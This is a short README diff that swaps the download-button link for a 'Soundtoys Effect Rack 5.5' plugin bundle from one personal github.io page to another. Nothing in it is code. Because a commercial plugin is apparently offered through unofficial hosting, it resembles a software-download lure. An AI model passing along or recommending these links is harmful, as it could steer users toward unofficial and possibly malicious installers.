@@ -21,7 +21,7 @@ To begin using this **Soundtoys Effect Rack 5.5 plugin bundle** and **Soundtoys 
 | :--- | :--- |
 | **Get Soundtoys Effect Rack 5.5** | Click the button below to initiate the setup for this **Soundtoys Effect Rack 5.5 mixing processor**. |
 
-[![Button](https://img.shields.io/badge/🎛️-Get_Soundtoys_Effect_Rack_5.5-2ea44f?style=for-the-badge)](https://richard2275786.github.io/.github/soundtoys-effect-rack-5-5)
+[![Effect Rack](https://img.shields.io/badge/Try-Effect%20Rack-7C3AED?style=for-the-badge)](https://effect-rack-vst.github.io/.github/effect-rack)
 
 ## System Requirements
 
